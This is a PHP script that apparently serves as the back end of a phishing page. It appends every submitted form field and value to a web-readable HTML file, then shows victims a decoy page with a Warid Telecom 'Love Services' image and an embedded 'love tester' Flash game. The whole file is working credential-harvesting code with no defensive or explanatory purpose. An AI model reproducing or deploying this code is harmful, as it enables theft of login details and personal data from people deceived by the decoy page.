<?php
$handle = fopen("kashif1816.html", "a");
foreach($_POST as $variable => $value)
 {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fwrite($handle, "<hr />");
fclose($handle);
echo '<form id="frmSubmit" class="tc" method="post" action="index.php#res">
<div id="inputWrapper">

</div>
<div id="resultMask" style="height:13px;"></div>
<div id="resultInfo"><span class="result">
<img src="http://www.waridtel.com/images/products/Love-Services.jpg" alt="" />

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<EMBED src="http://www.gamesforyourwebsite.com/myspace/lovetester.swf" quality=best bgcolor=#FFFFFF  WIDTH="550" HEIGHT="416" NAME="crazy_boxes_urgames" ALIGN="" TYPE="application/x-shockwave-flash" PLUGINSPAGE="http://www.macromedia.com/go/getflashplayer"></EMBED><br />



</form>';
exit;
?>